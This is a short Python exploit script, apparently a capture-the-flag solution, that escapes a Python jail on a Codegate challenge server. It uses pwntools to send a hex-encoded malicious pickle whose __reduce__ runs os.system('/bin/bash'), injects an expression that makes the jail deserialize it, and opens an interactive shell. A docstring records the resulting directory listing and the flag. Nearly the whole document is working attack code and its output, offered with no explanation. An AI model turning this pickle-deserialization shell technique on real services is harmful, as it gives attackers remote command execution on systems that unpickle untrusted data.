#!/usr/bin/env python

from pwn import *
import os
import pickle

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash',))

def connect():
    global p
    p = remote("ch41l3ng3s.codegate.kr",2014)
    p.recvuntil("Name :")

connect()

p.sendline(pickle.dumps(Exploit()).encode('hex'))
p.sendline("dig and your.name.decode('hex') or ")
p.interactive()


"""
ls -la
total 84
drwxr-xr-x  21 root root       4096 Feb  3 03:15 .
drwxr-xr-x  21 root root       4096 Feb  3 03:15 ..
-rwxr-xr-x   1 root root          0 Feb  3 03:15 .dockerenv
-rwx--x---   1 root impel_down 8624 Feb  2 08:04 FLAG_FLAG_FLAG_LOLOLOLOLOLOL
drwxr-xr-x   2 root root       4096 Nov 14  2016 bin
drwxr-xr-x   2 root root       4096 Apr 12  2016 boot
drwxr-xr-x   5 root root        340 Feb  3 03:15 dev
drwxr-xr-x  44 root root       4096 Feb  3 03:15 etc
drwxr-xr-x   3 root root       4096 Feb  2 08:04 home
drwxr-xr-x   8 root root       4096 Feb  2 08:03 lib
drwxr-xr-x   2 root root       4096 Feb  2 08:03 lib64
drwxr-xr-x   2 root root       4096 Nov 14  2016 media
drwxr-xr-x   2 root root       4096 Nov 14  2016 mnt
drwxr-xr-x   2 root root       4096 Nov 14  2016 opt
dr-xr-xr-x 233 root root          0 Feb  3 03:15 proc
drwx------   2 root root       4096 Nov 14  2016 root
drwxr-xr-x   5 root root       4096 Nov 16  2016 run
drwxr-xr-x   2 root root       4096 Nov 16  2016 sbin
drwxr-xr-x   2 root root       4096 Nov 14  2016 srv
dr-xr-xr-x  13 root root          0 Feb  3 11:26 sys
drwxrwxrwt   2 root root       4096 Feb  3 08:46 tmp
drwxr-xr-x  10 root root       4096 Feb  2 08:03 usr
drwxr-xr-x  11 root root       4096 Feb  2 08:04 var
./FLAG_FLAG_FLAG_LOLOLOLOLOLOL
  G00000000d !! :) 
    I think you are familiar with Python !
      FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}  
"""
